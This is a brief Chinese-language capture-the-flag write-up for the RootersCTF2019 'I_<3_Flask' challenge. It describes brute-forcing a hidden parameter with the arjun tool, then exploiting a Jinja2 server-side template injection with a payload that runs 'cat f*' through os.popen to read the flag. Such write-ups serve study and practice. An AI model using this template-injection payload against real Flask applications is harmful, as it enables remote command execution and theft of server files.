# [RootersCTF2019]I_＜3_Flask

第一次遇到参数爆破 记录一下

确实 我扫目录 robots.txt 啥都没有 功能点都没有.....

但是确实没有想到参数爆破

```cobol
pip3 install arjun
```



代码为

```r
arjun -u   url -m -c 100 -d 5
 
-d选项来延迟请求发送的间隔时间
 
-c可以通过指定一次发送的参数数量
```

很慢 等他爆破吧

爆出来了 name

我们去输入一下

这道题目就提示SSTI

很简单没有过滤

```handlebars
{{lipsum.__globals__['os'].popen("cat f*").read()}}
```

没啥特殊的 就是参数爆破第一次遇到